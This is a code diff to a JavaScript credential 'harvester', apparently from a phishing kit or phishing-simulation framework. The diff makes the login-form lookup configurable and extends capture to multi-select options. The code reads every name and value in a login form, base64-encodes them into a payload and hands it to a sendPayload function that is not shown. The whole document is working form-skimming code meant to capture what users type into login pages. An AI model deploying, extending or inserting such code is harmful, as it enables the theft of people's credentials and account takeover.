@@ -10,7 +10,7 @@ $(document).ready(function() {
 });
 
 function initHarvester() {
-	var loginForm = document.getElementById("loginform");
+	var loginForm = document.getElementById(formName);
 	if(loginForm) {
 		$('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
 		$('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
@@ -20,7 +20,7 @@ function initHarvester() {
 		});
 		console.log("locked and loaded");
 	} else {
-		console.log("ERROR: harvester failed to locate 'loginform', check your HTML");
+		console.log("ERROR: harvester failed to locate form '" + formName + "', check the HTML");
 	}
 }
 
@@ -32,11 +32,21 @@ function grabAll() {
 		for(var i = 0; i < loginForm.length; i++) {
 			var formElement = loginForm.elements[i];
 			if(formElement) {
-				console.log("DEBUG: name: " + formElement.name);
+				console.log("DEBUG: name: " + formElement.name);		//	the name value should always be set, but we may want to check (JavaScript forms could use ids)
 				console.log("DEBUG: value: " +  formElement.value);
 			
 				if(formElement instanceof HTMLSelectElement) {
-					console.log("need to parse all selectedOptions");
+					console.log("DEBUG: need to parse all selectedOptions");
+					if(formElement.multiple) {
+						console.log("DEBUG: gotta catch em all");
+						console.log("DEBUG: selectedOptions: " + formElement.selectedOptions);
+						var optionList = formElement.selectedOptions;
+						if(optionList.length > 0) {
+							for(j = 0; j < optionList.length; j++) {
+								console.log("DEBUG: option number [" + j + "] = " + optionList[j].text);
+							}
+						}
+					}
 				}
 				
 				if(payload == "")
@@ -50,10 +60,10 @@ function grabAll() {
 			console.log("DEBUG: before base 64 encoding: " + payload);
 			payload = btoa(payload);
 		}
-		console.log("resulting payload = " + payload);
+		console.log("DEBUG: resulting payload = " + payload);
 		sendPayload(payload);
 	} else {
-		console.log("ERROR: harvester failed to locate '" + formName + "', check your HTML");
+		console.log("ERROR: harvester failed to locate '" + formName + "', check the HTML");
 	}
 }
 
